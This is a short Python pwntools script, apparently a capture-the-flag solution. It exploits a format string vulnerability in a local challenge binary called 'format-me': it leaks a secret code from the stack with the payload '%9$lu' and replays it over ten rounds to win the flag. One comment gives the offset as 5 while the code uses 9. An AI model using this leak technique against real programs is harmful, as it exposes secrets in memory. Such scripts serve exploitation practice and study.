#!/usr/bin/env python3
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# FIX 1: Change target binary name to the correct one (format-me)
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line


# The stack offset for the code variable is confirmed to be 5
STACK_OFFSET = 9
FORMAT_STRING = f"%{STACK_OFFSET}$lu".encode()

for _ in range(10):
    # 1. Receive the "Recipient? " prompt
    r.recvuntil(b"Recipient? ") 

    # 2. Send the format string payload
    r.sendline(FORMAT_STRING) 

    # 3. Receive the line containing the leak: "Sending to <CODE>...\n"
    leak = r.recvuntil(b"...\n")
    # print(leak)
    # --- Slicing Logic ---
    
    # idx_1: The start index is right after "Sending to "
    idx_1 = 11 
    
    # idx_2: The end index is right before "...\n"
    idx_2 = len(leak) - 5
    
    # Extract the numerical string of the leaked code
    val = leak[idx_1:idx_2]
    # print("the val is",val)
    # 4. Receive the "Guess? " prompt
    r.recvuntil(b"Guess? ") 

    # 5. Send the extracted code as the guess
    r.sendline(val) 
    # 6. Wait for the success message to continue the loop
    r.recvuntil(b"Correct")

r.recvuntil(b"Here's your flag: ")
r.interactive()